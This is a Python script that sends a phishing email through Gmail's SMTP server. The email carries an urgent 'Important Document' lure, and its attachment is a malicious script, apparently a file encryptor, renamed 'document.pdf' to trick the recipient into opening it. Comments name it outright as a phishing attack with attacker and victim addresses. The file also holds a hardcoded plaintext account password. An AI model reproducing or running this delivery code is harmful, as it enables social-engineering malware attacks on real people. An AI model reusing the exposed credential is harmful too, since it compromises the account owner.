import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

# Email sender and receiver
sender_email = "bemnetmerkebu17+attacker@gmail.com"
receiver_email = "bemnetmerkebu17+victim@gmail.com"
password = "Drury1712!"  # Use an app-specific password or secure mechanism if using Gmail

# Set up the server (example for Gmail's SMTP)
smtp_server = "smtp.gmail.com"
smtp_port = 587

# Create the email headers
message = MIMEMultipart()
message['From'] = sender_email
message['To'] = receiver_email
message['Subject'] = "Urgent: Important Document Attached"

# Email body
body = "Please find the attached document. Open it as soon as possible."

# Attach the email body to the message
message.attach(MIMEText(body, 'plain'))

# File to be sent (rename your malicious script as a PDF for the purpose of the phishing attack)
filename = "document.pdf"  # Actual malicious Python script renamed as .pdf
file_path = "encrypt.py"  # Actual path to the Python script

# Open the file to be sent as an attachment
with open(file_path, "rb") as attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename={filename}")

# Attach the file to the email
message.attach(part)

# Convert the message to a string
text = message.as_string()

# Send the email
try:
    # Set up the SMTP server connection
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()  # Upgrade connection to secure (TLS)
    server.login(sender_email, password)

    # Send the email
    server.sendmail(sender_email, receiver_email, text)
    print("Email sent successfully!")

except Exception as e:
    print(f"Failed to send email: {e}")

finally:
    # Close the server connection
    server.quit()
